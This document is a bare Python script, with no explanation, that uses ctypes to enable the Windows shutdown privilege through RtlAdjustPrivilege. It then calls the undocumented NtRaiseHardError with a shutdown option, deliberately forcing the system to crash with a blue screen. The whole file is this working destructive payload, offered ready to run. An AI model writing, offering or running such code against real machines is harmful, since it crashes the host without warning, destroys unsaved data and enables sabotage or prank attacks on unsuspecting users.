#!/usr/bin/env python3
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
	c_uint(19),
	c_uint(1),
    c_uint(0),
	byref(c_int())
)

windll.ntdll.NtRaiseHardError(
	c_ulong(0xc000007B),
	c_ulong(0),
	nullptr,
	nullptr,
	c_uint(6),
	byref(c_uint())
)